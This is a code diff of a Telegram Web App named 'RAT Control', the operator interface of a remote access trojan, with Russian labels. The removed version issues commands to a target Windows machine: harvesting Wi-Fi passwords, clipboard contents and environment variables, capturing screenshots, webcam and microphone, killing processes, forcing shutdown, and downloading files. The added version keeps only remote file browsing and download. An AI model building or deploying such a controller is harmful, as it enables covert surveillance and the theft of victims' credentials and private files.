@@ -2,886 +2,160 @@
 <html>
 <head>
     <title>RAT Control</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: var(--tg-theme-bg-color, #f5f5f5);
-            color: var(--tg-theme-text-color, #333);
+            font-family: Arial, sans-serif;
             padding: 16px;
-            padding-bottom: 80px;
+            background: #f5f5f5;
         }
-
-        .header {
-            background: linear-gradient(135deg, #0088cc, #006699);
-            color: white;
-            margin: -16px -16px 20px -16px;
-            padding: 20px 16px;
-            border-radius: 0 0 20px 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 4px;
-        }
-
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-
-        .tabs {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 20px;
-            background: var(--tg-theme-secondary-bg-color, white);
-            padding: 8px;
-            border-radius: 30px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 10px;
-            border-radius: 25px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: var(--tg-theme-hint-color, #666);
-        }
-
-        .tab.active {
-            background: var(--tg-theme-button-color, #0088cc);
-            color: white;
-            box-shadow: 0 2px 8px rgba(0,136,204,0.3);
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .card {
-            background: var(--tg-theme-secondary-bg-color, white);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-
-        .card-title {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: var(--tg-theme-button-color, #0088cc);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .action-bar {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 16px;
-            flex-wrap: wrap;
-        }
-
-        .action-btn {
-            background: var(--tg-theme-button-color, #0088cc);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            padding: 12px 20px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            flex: 1;
-            min-width: 100px;
-            transition: all 0.2s;
-        }
-
-        .action-btn:active {
-            transform: scale(0.97);
-            opacity: 0.8;
-        }
-
-        .action-btn.secondary {
-            background: var(--tg-theme-secondary-bg-color, #e0e0e0);
-            color: var(--tg-theme-text-color, #333);
-        }
-
-        .action-btn.danger {
-            background: #dc3545;
-        }
-
-        .action-btn.warning {
-            background: #ffc107;
-            color: #333;
-        }
-
-        .output {
-            background: var(--tg-theme-bg-color, #f0f0f0);
-            border-radius: 12px;
-            padding: 16px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            word-break: break-word;
-            max-height: 400px;
-            overflow-y: auto;
-            border: 1px solid var(--tg-theme-hint-color, #ddd);
-        }
-
         .file-list {
-            margin-top: 12px;
-            max-height: 400px;
-            overflow-y: auto;
-            border: 1px solid var(--tg-theme-hint-color, #ddd);
-            border-radius: 12px;
+            margin-top: 20px;
         }
-
         .file-item {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            border-bottom: 1px solid var(--tg-theme-hint-color, #eee);
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
             cursor: pointer;
-            transition: background 0.2s;
         }
-
         .file-item:hover {
-            background: var(--tg-theme-bg-color, #f0f0f0);
+            background: #e0e0e0;
         }
-
-        .file-item:last-child {
-            border-bottom: none;
-        }
-
-        .file-icon {
-            width: 30px;
-            font-size: 18px;
-        }
-
-        .file-name {
-            flex: 1;
-            font-weight: 500;
-            margin-right: 10px;
-            word-break: break-word;
-        }
-
-        .file-size {
-            color: var(--tg-theme-hint-color, #666);
-            font-size: 12px;
-            margin-right: 10px;
-            white-space: nowrap;
-        }
-
-        .file-date {
-            color: var(--tg-theme-hint-color, #666);
-            font-size: 12px;
-            white-space: nowrap;
-        }
-
-        .proc-header {
-            display: flex;
-            padding: 10px;
-            background: var(--tg-theme-button-color, #0088cc);
-            color: white;
-            border-radius: 8px 8px 0 0;
-            font-weight: 600;
-            font-size: 13px;
-        }
-
-        .proc-row {
-            display: flex;
-            padding: 10px;
-            border-bottom: 1px solid var(--tg-theme-hint-color, #eee);
-            font-size: 12px;
-        }
-
-        .proc-pid { width: 60px; }
-        .proc-name { flex: 1; }
-        .proc-cpu { width: 60px; text-align: right; }
-        .proc-ram { width: 60px; text-align: right; }
-
         .status {
-            position: fixed;
-            bottom: 80px;
-            left: 16px;
-            right: 16px;
-            background: var(--tg-theme-secondary-bg-color, white);
-            border-radius: 30px;
-            padding: 12px 20px;
-            font-size: 14px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
             display: none;
-            align-items: center;
-            gap: 8px;
-            z-index: 1000;
         }
-
-        .status.show {
-            display: flex;
-        }
-
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        .path-bar {
-            background: var(--tg-theme-bg-color, #f0f0f0);
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 12px;
-            font-family: monospace;
-            font-size: 12px;
-            word-break: break-all;
-        }
-
-        .input-group {
-            display: flex;
-            gap: 8px;
-            margin: 12px 0;
-        }
-
-        .input {
-            flex: 1;
-            padding: 12px;
-            border-radius: 12px;
-            border: 1px solid var(--tg-theme-hint-color, #ddd);
-            background: var(--tg-theme-bg-color, white);
-            color: var(--tg-theme-text-color, #333);
-            font-size: 14px;
-            outline: none;
-        }
-
-        .input:focus {
-            border-color: var(--tg-theme-button-color, #0088cc);
-        }
-
-        .bottom-bar {
+        .loading {
             position: fixed;
-            bottom: 0;
+            top: 0;
             left: 0;
             right: 0;
-            background: var(--tg-theme-secondary-bg-color, white);
-            padding: 12px 16px;
-            border-top: 1px solid var(--tg-theme-hint-color, #eee);
+            bottom: 0;
+            background: rgba(255,255,255,0.9);
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            backdrop-filter: blur(10px);
+            z-index: 1000;
         }
-
-        .bottom-bar button {
-            background: var(--tg-theme-button-color, #0088cc);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .bottom-bar span {
-            color: var(--tg-theme-hint-color, #666);
-            font-size: 13px;
+        .loading.hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🤖 RAT CONTROL</h1>
-        <p>Управление компьютером через Telegram</p>
+    <h1>📁 Файловый менеджер</h1>
+    
+    <div id="currentPath">Загрузка...</div>
+    
+    <div style="margin: 20px 0;">
+        <button onclick="loadFiles()">📋 Обновить список</button>
+        <button onclick="goBack()">⬆️ Назад</button>
     </div>
-
-    <!-- Вкладки -->
-    <div class="tabs">
-        <div class="tab active" onclick="switchTab('system')">📊 Система</div>
-        <div class="tab" onclick="switchTab('files')">📁 Файлы</div>
-        <div class="tab" onclick="switchTab('processes')">📋 Процессы</div>
-        <div class="tab" onclick="switchTab('media')">🎥 Медиа</div>
+    
+    <div id="fileList" class="file-list">
+        Нажмите кнопку для загрузки
     </div>
-
-    <!-- ==================== ВКЛАДКА СИСТЕМА ==================== -->
-    <div id="tab-system" class="tab-content active">
-        <div class="card">
-            <div class="card-title">📊 ИНФОРМАЦИЯ О СИСТЕМЕ</div>
-            <div class="action-bar">
-                <button class="action-btn" onclick="loadSystemInfo()">🔄 Обновить</button>
-                <button class="action-btn secondary" onclick="loadCPU()">⚙️ CPU</button>
-                <button class="action-btn secondary" onclick="loadRAM()">💾 RAM</button>
-                <button class="action-btn secondary" onclick="loadDisk()">💿 Диск</button>
-            </div>
-            <div id="systemInfo" class="output">
-                Нажмите кнопку для загрузки информации
-            </div>
+    
+    <div class="loading hidden" id="loading">
+        <div style="text-align: center;">
+            <div style="font-size: 48px;">⏳</div>
+            <div>Загрузка...</div>
         </div>
-
-        <div class="card">
-            <div class="card-title">⚡ УПРАВЛЕНИЕ ПИТАНИЕМ</div>
-            <div class="action-bar">
-                <button class="action-btn warning" onclick="sendCommand('restart')">🔄 Перезагрузка</button>
-                <button class="action-btn danger" onclick="sendCommand('shutdown')">⏻ Выключение</button>
-                <button class="action-btn secondary" onclick="sendCommand('lock')">🔒 Блокировка</button>
-                <button class="action-btn secondary" onclick="sendCommand('sleep')">😴 Сон</button>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">🌐 СЕТЬ</div>
-            <div class="action-bar">
-                <button class="action-btn" onclick="loadNetwork()">📡 Информация</button>
-                <button class="action-btn secondary" onclick="loadWiFi()">📶 Wi-Fi пароли</button>
-            </div>
-            <div id="networkInfo" class="output">
-                Нажмите для загрузки
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">🔧 ДОПОЛНИТЕЛЬНО</div>
-            <div class="action-bar">
-                <button class="action-btn secondary" onclick="loadEnv()">🌍 Переменные</button>
-                <button class="action-btn secondary" onclick="loadClipboard()">📋 Буфер обмена</button>
-                <button class="action-btn secondary" onclick="loadUser()">👤 Пользователь</button>
-            </div>
-            <div id="extraInfo" class="output"></div>
-        </div>
-    </div>
-
-    <!-- ==================== ВКЛАДКА ФАЙЛЫ ==================== -->
-    <div id="tab-files" class="tab-content">
-        <div class="card">
-            <div class="card-title">📁 ФАЙЛОВЫЙ МЕНЕДЖЕР</div>
-            
-            <div class="path-bar" id="currentPath">Загрузка пути...</div>
-            
-            <div class="action-bar">
-                <button class="action-btn" onclick="loadFiles()">📋 Список</button>
-                <button class="action-btn secondary" onclick="goBack()">⬆️ Назад</button>
-                <button class="action-btn secondary" onclick="refreshFiles()">🔄 Обновить</button>
-            </div>
-
-            <div class="input-group">
-                <input type="text" id="folderPath" class="input" placeholder="Введите путь (например: Windows/System32)">
-                <button class="action-btn secondary" onclick="changeDir()" style="flex: 0; padding: 12px 20px;">Перейти</button>
-            </div>
-
-            <div class="input-group">
-                <input type="text" id="fileName" class="input" placeholder="Имя файла для скачивания">
-                <button class="action-btn" onclick="downloadFile()" style="flex: 0; padding: 12px 20px;">📥 Скачать</button>
-            </div>
-
-            <div id="fileList" class="file-list">
-                <div class="file-item">
-                    <span class="file-icon">📁</span>
-                    <span class="file-name">Загрузка...</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ==================== ВКЛАДКА ПРОЦЕССЫ ==================== -->
-    <div id="tab-processes" class="tab-content">
-        <div class="card">
-            <div class="card-title">📋 МЕНЕДЖЕР ПРОЦЕССОВ</div>
-            
-            <div class="action-bar">
-                <button class="action-btn" onclick="loadProcesses()">📊 Все процессы</button>
-                <button class="action-btn secondary" onclick="loadTopCPU()">⚡ По CPU</button>
-                <button class="action-btn secondary" onclick="loadTopRAM()">💾 По RAM</button>
-                <button class="action-btn secondary" onclick="refreshProcesses()">🔄 Обновить</button>
-            </div>
-
-            <div class="input-group">
-                <input type="number" id="pid" class="input" placeholder="PID процесса">
-                <button class="action-btn danger" onclick="killProcess()" style="flex: 0; padding: 12px 20px;">🔪 Убить</button>
-            </div>
-
-            <div style="border: 1px solid var(--tg-theme-hint-color, #ddd); border-radius: 12px; overflow: hidden;">
-                <div class="proc-header">
-                    <span class="proc-pid">PID</span>
-                    <span class="proc-name">Имя</span>
-                    <span class="proc-cpu">CPU %</span>
-                    <span class="proc-ram">RAM %</span>
-                </div>
-                <div id="processesContent" style="max-height: 400px; overflow-y: auto;">
-                    Нажмите кнопку для загрузки
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ==================== ВКЛАДКА МЕДИА ==================== -->
-    <div id="tab-media" class="tab-content">
-        <div class="card">
-            <div class="card-title">🎥 МЕДИА</div>
-            <p style="margin-bottom: 16px; color: var(--tg-theme-hint-color);">
-                Медиафайлы будут отправлены в чат с ботом
-            </p>
-            <div class="action-bar">
-                <button class="action-btn" onclick="sendMedia('screen')">📸 Скриншот</button>
-                <button class="action-btn" onclick="sendMedia('webcam')">📷 Вебкамера</button>
-                <button class="action-btn" onclick="sendMedia('mic')">🎤 Микрофон</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Статус -->
-    <div id="status" class="status">
-        <span id="statusText"></span>
-    </div>
-
-    <!-- Нижняя панель -->
-    <div class="bottom-bar">
-        <span>🟢 Онлайн</span>
-        <button onclick="closeApp()">ЗАКРЫТЬ</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.ready();
-        tg.disableVerticalSwipes(); // Запрещаем свайпы
-        tg.enableClosingConfirmation(); // Спрашиваем подтверждение
-
-        let currentDir = 'C:\\';
         
-        // ==================== ОТПРАВКА ЗАПРОСА ====================
-        async function sendRequest(action, data = {}) {
-            return new Promise((resolve, reject) => {
-                const requestId = Date.now();
-                const message = JSON.stringify({
-                    action: action,
-                    data: data,
-                    requestId: requestId
-                });
-                
-                showStatus('⏳ Отправка запроса...', 'warning');
-                console.log('📤 Отправка запроса:', action, data);
-                
-                // Сохраняем callback
-                window.pendingRequests = window.pendingRequests || {};
-                window.pendingRequests[requestId] = { resolve, reject };
-                
-                // Отправляем
-                tg.sendData(message);
-                
-                // Таймаут
-                setTimeout(() => {
-                    if (window.pendingRequests[requestId]) {
-                        delete window.pendingRequests[requestId];
-                        reject(new Error('Таймаут'));
-                        showStatus('❌ Таймаут', 'error');
-                    }
-                }, 10000);
-            });
-        }
-
-        // ==================== ОБРАБОТКА ОТВЕТОВ ====================
-        tg.onEvent('web_app_data', function(data) {
-            console.log('📩 Получен ответ:', data);
+        let currentDir = 'C:\\';
+        let pendingRequest = null;
+        
+        // Функция загрузки файлов
+        function loadFiles() {
+            showLoading();
+            pendingRequest = Date.now();
             
-            try {
-                const response = JSON.parse(data);
-                console.log('📦 Распарсено:', response);
-                
-                // Проверяем есть ли ожидающий запрос
-                if (response.requestId && window.pendingRequests?.[response.requestId]) {
-                    if (response.error) {
-                        window.pendingRequests[response.requestId].reject(new Error(response.error));
-                        showStatus('❌ ' + response.error, 'error');
-                    } else {
-                        window.pendingRequests[response.requestId].resolve(response.data);
-                        showStatus('✅ Данные получены', 'success');
-                    }
-                    delete window.pendingRequests[response.requestId];
-                } else if (response.data?.files) {
-                    // Это список файлов
-                    displayFileList(response.data);
-                }
-            } catch (e) {
-                console.error('Ошибка парсинга:', e);
-            }
-        });
-
-        // ==================== ОТОБРАЖЕНИЕ ФАЙЛОВ ====================
-        function displayFileList(data) {
-            console.log('📁 Отображаем файлы:', data);
+            tg.sendData(JSON.stringify({
+                action: 'list_files',
+                path: currentDir,
+                requestId: pendingRequest
+            }));
+        }
+        
+        // Функция "Назад"
+        function goBack() {
+            showLoading();
+            pendingRequest = Date.now();
             
-            if (data.current_dir) {
-                currentDir = data.current_dir;
-                document.getElementById('currentPath').textContent = currentDir;
-            }
+            tg.sendData(JSON.stringify({
+                action: 'go_back',
+                path: currentDir,
+                requestId: pendingRequest
+            }));
+        }
+        
+        // Отображение файлов
+        function displayFiles(data) {
+            if (!data || !data.files) return;
             
-            if (data.files && Array.isArray(data.files)) {
-                const fileList = document.getElementById('fileList');
-                let html = '';
-                
-                data.files.forEach(file => {
-                    const icon = file.is_dir ? '📁' : '📄';
-                    const size = file.size || '';
-                    const date = file.modified || '';
-                    const name = file.name || '?';
-                    
-                    html += `
-                        <div class="file-item" onclick="selectFile('${name.replace(/'/g, "\\'")}')">
-                            <span class="file-icon">${icon}</span>
-                            <span class="file-name">${name}</span>
-                            <span class="file-size">${size}</span>
-                            <span class="file-date">${date}</span>
-                        </div>
-                    `;
-                });
-                
-                fileList.innerHTML = html;
-                showStatus(`✅ Загружено ${data.files.length} элементов`, 'success');
-            }
-        }
-
-        // ==================== ФАЙЛЫ ====================
-        async function loadFiles() {
-            try {
-                const data = await sendRequest('list_files', { path: currentDir });
-                if (data && data.files) {
-                    displayFileList(data);
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function goBack() {
-            try {
-                const data = await sendRequest('go_back', { path: currentDir });
-                if (data && data.files) {
-                    displayFileList(data);
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function changeDir() {
-            const path = document.getElementById('folderPath').value;
-            if (!path) return;
-            
-            try {
-                const data = await sendRequest('change_dir', { current: currentDir, path: path });
-                if (data && data.files) {
-                    displayFileList(data);
-                    document.getElementById('folderPath').value = '';
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function refreshFiles() {
-            await loadFiles();
-        }
-
-        function selectFile(name) {
-            document.getElementById('fileName').value = name;
-        }
-
-        function downloadFile() {
-            const name = document.getElementById('fileName').value;
-            if (name) {
-                const fullPath = currentDir.endsWith('\\') ? currentDir + name : currentDir + '\\' + name;
-                sendMedia('get', { path: fullPath });
-            }
-        }
-
-        // ==================== СИСТЕМА ====================
-        async function loadSystemInfo() {
-            try {
-                const data = await sendRequest('system_info');
-                document.getElementById('systemInfo').innerHTML = formatSystemInfo(data);
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadCPU() {
-            try {
-                const data = await sendRequest('cpu_info');
-                let html = '⚙️ Процессор:\n\n';
-                if (data && data.cores) {
-                    data.cores.forEach((core, i) => {
-                        html += `Ядро ${i}: ${core}%\n`;
-                    });
-                    html += `\nЧастота: ${data.freq || '?'} МГц`;
-                }
-                document.getElementById('systemInfo').innerHTML = html;
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadRAM() {
-            try {
-                const data = await sendRequest('ram_info');
-                if (data) {
-                    document.getElementById('systemInfo').innerHTML = `
-💾 Память:
-Всего: ${data.total || '?'}
-Использовано: ${data.used || '?'} (${data.percent || '?'}%)
-Доступно: ${data.available || '?'}
-
-🔄 Swap:
-Всего: ${data.swap_total || '?'}
-Использовано: ${data.swap_used || '?'}
-                    `;
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadDisk() {
-            try {
-                const disks = await sendRequest('disk_info');
-                if (disks && disks.length > 0) {
-                    let html = '💿 Диски:\n\n';
-                    disks.forEach(disk => {
-                        html += `${disk.device || '?'} (${disk.mount || '?'})\n`;
-                        html += `  Всего: ${disk.total || '?'}\n`;
-                        html += `  Использовано: ${disk.used || '?'} (${disk.percent || '?'}%)\n`;
-                        html += `  Свободно: ${disk.free || '?'}\n\n`;
-                    });
-                    document.getElementById('systemInfo').innerHTML = html;
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadNetwork() {
-            try {
-                const data = await sendRequest('network_info');
-                if (data) {
-                    document.getElementById('networkInfo').innerHTML = `
-🌐 Сеть:
-Компьютер: ${data.hostname || '?'}
-Локальный IP: ${data.local_ip || '?'}
-Внешний IP: ${data.external_ip || '?'}
-
-📊 Трафик:
-Отправлено: ${data.bytes_sent || '?'}
-Получено: ${data.bytes_recv || '?'}
-                    `;
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadWiFi() {
-            try {
-                const wifiList = await sendRequest('wifi_info');
-                if (wifiList && wifiList.length > 0) {
-                    document.getElementById('networkInfo').innerHTML = '📶 Wi-Fi пароли:\n\n' + wifiList.join('\n');
-                } else {
-                    document.getElementById('networkInfo').innerHTML = '📶 Wi-Fi сети не найдены';
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadEnv() {
-            try {
-                const env = await sendRequest('env_info');
-                if (env) {
-                    let html = '🌍 Переменные окружения:\n\n';
-                    let count = 0;
-                    for (let [key, value] of Object.entries(env)) {
-                        if (count++ < 30) {
-                            html += `${key}=${value}\n`;
-                        }
-                    }
-                    document.getElementById('extraInfo').innerHTML = html;
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadClipboard() {
-            try {
-                const data = await sendRequest('clipboard');
-                document.getElementById('extraInfo').innerHTML = data && data.text ? `<pre>${data.text}</pre>` : 'Пусто';
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadUser() {
-            try {
-                const data = await sendRequest('user_info');
-                if (data) {
-                    document.getElementById('extraInfo').innerHTML = `
-👤 Пользователь: ${data.name || '?'}
-💻 Компьютер: ${data.computer || '?'}
-🏠 Домашняя папка: ${data.home || '?'}
-📁 Текущая папка: ${data.cwd || '?'}
-                    `;
-                }
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        // ==================== ПРОЦЕССЫ ====================
-        function formatProcessList(processes) {
-            if (!processes || processes.length === 0) {
-                return '<div class="proc-row">Нет процессов</div>';
-            }
+            currentDir = data.current_dir;
+            document.getElementById('currentPath').innerText = currentDir;
             
             let html = '';
-            processes.forEach(p => {
+            data.files.forEach(f => {
+                const icon = f.is_dir ? '📁' : '📄';
                 html += `
-                    <div class="proc-row">
-                        <span class="proc-pid">${p.pid || '?'}</span>
-                        <span class="proc-name">${p.name || '?'}</span>
-                        <span class="proc-cpu">${p.cpu || '0'}%</span>
-                        <span class="proc-ram">${p.ram || '0'}%</span>
+                    <div class="file-item" onclick="downloadFile('${f.name}')">
+                        ${icon} ${f.name} 
+                        <span style="float:right">${f.size}</span>
                     </div>
                 `;
             });
-            return html;
+            
+            document.getElementById('fileList').innerHTML = html;
+            hideLoading();
         }
-
-        async function loadProcesses() {
+        
+        // Скачивание файла
+        function downloadFile(name) {
+            tg.sendData(JSON.stringify({
+                action: 'get',
+                path: currentDir + '\\' + name,
+                requestId: Date.now()
+            }));
+        }
+        
+        // Показ загрузки
+        function showLoading() {
+            document.getElementById('loading').classList.remove('hidden');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loading').classList.add('hidden');
+        }
+        
+        // Обработка входящих данных
+        tg.onEvent('web_app_data', function(data) {
             try {
-                const data = await sendRequest('processes');
-                document.getElementById('processesContent').innerHTML = formatProcessList(data);
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadTopCPU() {
-            try {
-                const data = await sendRequest('top_cpu');
-                document.getElementById('processesContent').innerHTML = formatProcessList(data);
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function loadTopRAM() {
-            try {
-                const data = await sendRequest('top_ram');
-                document.getElementById('processesContent').innerHTML = formatProcessList(data);
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-            }
-        }
-
-        async function refreshProcesses() {
-            await loadProcesses();
-        }
-
-        async function killProcess() {
-            const pid = document.getElementById('pid').value;
-            if (pid) {
-                try {
-                    await sendRequest('kill_process', { pid: parseInt(pid) });
-                    showStatus('✅ Процесс завершен', 'success');
-                    await loadProcesses();
-                } catch (error) {
-                    showStatus('❌ ' + error.message, 'error');
+                const response = JSON.parse(data);
+                console.log('📩 Получено:', response);
+                
+                if (response.data && response.data.files) {
+                    displayFiles(response.data);
+                } else if (response.error) {
+                    alert('Ошибка: ' + response.error);
+                    hideLoading();
                 }
+            } catch (e) {
+                console.error('Ошибка парсинга:', e);
+                hideLoading();
             }
-        }
-
-        // ==================== МЕДИА (В ЧАТ) ====================
-        function sendMedia(type, params = {}) {
-            const message = JSON.stringify({
-                action: type,
-                data: params
-            });
-            tg.sendData(message);
-            showStatus(`📸 Запрос ${type} отправлен`, 'success');
-        }
-
-        // ==================== УПРАВЛЕНИЕ ====================
-        function sendCommand(cmd) {
-            const message = JSON.stringify({
-                action: cmd
-            });
-            tg.sendData(message);
-            showStatus(`⚡ Команда ${cmd} отправлена`, 'warning');
-        }
-
-        // ==================== ФОРМАТТЕРЫ ====================
-        function formatSystemInfo(data) {
-            if (!data) return 'Нет данных';
-            return `
-🖥️ ОС: ${data.os || '?'} ${data.release || ''}
-💻 Компьютер: ${data.hostname || '?'}
-👤 Пользователь: ${data.username || '?'}
-⏱️ Запуск: ${data.boot_time || '?'}
-
-⚙️ Процессор: ${data.cpu_count || '?'} ядер, ${data.cpu_percent || '?'}%
-💾 ОЗУ: ${data.ram_used || '?'}/${data.ram_total || '?'} ГБ (${data.ram_percent || '?'}%)
-💿 Диск C: ${data.disk_used || '?'}/${data.disk_total || '?'} ГБ (${data.disk_percent || '?'}%)
-            `;
-        }
-
-        // ==================== УПРАВЛЕНИЕ ВКЛАДКАМИ ====================
-        function switchTab(tabName) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            
-            event.target.classList.add('active');
-            document.getElementById(`tab-${tabName}`).classList.add('active');
-        }
-
-        // ==================== СТАТУС ====================
-        function showStatus(text, type = 'info') {
-            const status = document.getElementById('status');
-            const statusText = document.getElementById('statusText');
-            
-            status.className = 'status show ' + type;
-            statusText.textContent = text;
-            
-            setTimeout(() => {
-                status.classList.remove('show');
-            }, 3000);
-        }
-
-        // ==================== ЗАКРЫТИЕ ====================
-        function closeApp() {
-            tg.close();
-        }
-
-        // Загружаем файлы при старте
+        });
+        
+        // Загружаем при старте
         setTimeout(loadFiles, 500);
     </script>
 </body>
